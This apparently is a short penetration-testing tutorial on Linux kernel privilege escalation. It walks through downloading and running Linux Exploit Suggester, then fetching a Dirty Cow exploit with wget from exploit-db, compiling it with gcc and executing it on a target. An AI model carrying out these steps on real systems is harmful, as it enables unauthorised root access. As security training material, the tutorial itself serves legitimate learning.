Linux Kernel Exploits target vulnerabilities in the **Linux Kernel**, the core component of the operating system. These exploits typically lead to **privilege escalation**, where an attacker can gain higher system privileges.

## Linux Exploit Suggester
The [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) tool identifies kernel vulnerabilities by analyzing the system's Linux kernel version and suggests relevant exploits that can be used for privilege escalation.

#### Downloading the Tool
Download the raw script.
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

#### Running the script

1. **Execute the script**:  
Simply run it to detect kernel vulnerabilities:
```bash
./linux-exploit-suggester.sh
```

2. **Analyze the output**:  
The script identifies the Linux kernel version and lists exploits for potential privilege escalation.
```bash
Kernel Version: 4.4.0-21-generic
Potential Exploits:
[+] Dirty Cow (CVE-2016-5195)
    https://www.exploit-db.com/exploits/40839/
[+] Overlayfs (CVE-2015-1328)
    https://www.exploit-db.com/exploits/37292/
```

#### Using Suggested Exploits

1. **Download the exploit**:  
Fetch the suggested exploit from `exploit-db` or the CVE link provided.

```bash
wget https://www.exploit-db.com/download/40839 -O dirtycow.c
```

2. **Compile the exploit** (if needed):  
Use `gcc` or `make` to compile the exploit code.

```bash
gcc dirtycow.c -o dirtycow -pthread
```

3. **Run the exploit**:  
Execute the binary on the target system.

```bash
./dirtycow
```
